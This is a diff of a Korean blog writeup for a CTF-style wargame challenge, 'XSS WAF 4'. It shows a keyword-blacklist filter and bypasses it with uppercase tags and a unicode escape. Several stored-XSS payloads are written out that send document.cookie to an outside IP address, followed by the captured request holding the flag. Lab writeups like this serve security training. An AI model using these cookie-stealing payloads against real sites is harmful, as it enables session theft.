@@ -1,58 +1,36 @@
 ---
-title: "[Writeup] Knockon Bootcamp 2nd - 5.4 xss_WAF_4"
+title: "KnockOn Bootcamp 2nd - 5.4 XSS WAF 4"
 categories:
   - Web Hacking
 tags:
   - Wargame
-  - Knockon Bootcamp 2nd
-  - Cross Site Scripting
+  - KnockOn Bootcamp 2nd
+  - XSS
   - Stored XSS
   - Filter Bypass
-last_modified_at: 2024-09-09T17:20:00-05:00
+last_modified_at: 2024-09-10T07:20:00+09:00
 published: true
 ---
-
-|
-
 ## 문제
 
 <http://war.knock-on.org:10043/>
 
-![5.4 xss_WAF_4 1](/assets/images/writeup/web-hacking/knock-on/5-4_XSS_1.png)
+![5.4 xss_WAF_4 1](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-4-xss-1.png)
 
-![5.4 xss_WAF_4 2](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_2.png)
+![5.4 xss_WAF_4 2](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-4-xss-1.png)
 
-![5.4 xss_WAF_4 3](/assets/images/writeup/web-hacking/knock-on/5-1_XSS_3.png)
-
-
-|
-
-|
-
-|
+![5.4 xss_WAF_4 3](/assets/images/writeup/web-hacking/knock-on/knock-on-challenge-5-4-xss-1.png)
 
 ### 목표
 
----
-
 게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기
 
-|
-
 ### 공격 기법
-
----
 
 Cross Site Scripting
 
 - Stored XSS
 - Filter Bypass
-
-|
-
-|
-
-|
 
 ## 문제 코드
 
@@ -197,17 +175,9 @@ if __name__ == "__main__":
 
 ```
 
-|
-
-|
-
-|
-
 ## 코드 분석
 
 ### add_post()
-
----
 
 ```python
 black_list = ["script","img","on","error"]
@@ -229,21 +199,15 @@ def add_post():
 
 `<script>`태그와 `<img>`태그가 막힘
 
-`on` 과 `error`키워드도 막혀서 `onerror` 사용 불가.
+`on` 과 `error`키워드도 막혀서 `onerror` 사용 불가
 
-|
-
-|
-
-## Exploit
+## 풀이
 
 ```python
 <SCRIPT>alert(1)</SCRIPT>
 ```
 
 대소문자를 필터링하는 코드가 없음. 대문자로 우회가 됨
-
-|
 
 ```python
 <SCRIPT SRC="1">location.href=""</SCRIPT>
@@ -257,15 +221,11 @@ HTML의 속성을 알아보면
 
 `location.href=””`부분이 javascript
 
-|
-
 ```python
 <SCRIPT>location.href="http://20.41.120.97:10010/"+document.cookie</SCRIPT>
 ```
 
 페이로드는 이런 형식이 됨
-
-|
 
 ```python
 <SCRIPT>locati\u006Fn.href="http://20.41.120.97:10010/"+document.cookie</SCRIPT>
@@ -273,23 +233,19 @@ HTML의 속성을 알아보면
 
  `location`의 `on`은 유니코드로 우회가능
 
-|
-
 ```python
 <svg ONLOAD="locati\u006Fn.href='http://20.41.120.97:10010/' + document.cookie"></svg>
 <svg ONload=locati\u006Fn.href="http://20.41.120.97:10010/"+document.cookie>
 <IMG src="1" ONERROR="locati\u006Fn.href='http://20.41.120.97:10010/' + document.cookie"></IMG>
 ```
 
-다른 페이로드도 가능하다
+다른 페이로드도 가능
 
 속성 이름은 대문자 가능. 값은 ㄴㄴ
 
 자바스크립트에서는 변수와 객체 이름은 대소문자를 구분함
 
 ### 결과
-
----
 
 ```sql
 GET /cookie=K0%7Byou_4r3_th3_b3st_h4ck3r!%7D HTTP/1.1
@@ -302,25 +258,13 @@ Referer: http://localhost:10006/
 Accept-Encoding: gzip, deflate
 ```
 
-|
-
-|
-
-|
-
-## Payload
+## 페이로드
 
 ```sql
 <SCRIPT>locati\u006Fn.href="http://20.41.120.97:10010/"+document.cookie</SCRIPT>
 ```
 
-|
-
-|
-
 ### FLAG
-
----
 
 ```python
 K0{you_4r3_th3_b3st_h4ck3r!}
